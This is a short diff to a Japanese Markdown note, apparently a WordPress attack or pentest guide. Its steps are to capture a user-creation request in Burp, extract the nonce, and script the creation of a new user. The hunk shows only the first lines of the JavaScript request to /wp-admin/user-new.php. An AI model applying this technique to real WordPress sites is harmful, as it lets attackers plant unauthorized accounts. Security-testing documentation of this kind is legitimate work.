@@ -72,7 +72,8 @@
 2. HTTPリクエストを使用した処理（ユーザー作成等）のリクエストをBurpでキャプチャしておく
 
 3. nonceの値を抽出し、そのnonceを使ってユーザーを作成するスクリプトを作成（コメントは削除して使用）
-- nonce抽出
+
+nonce抽出
 ```js
 var ajaxRequest = new XMLHttpRequest();
 var requestURL = "/wp-admin/user-new.php";
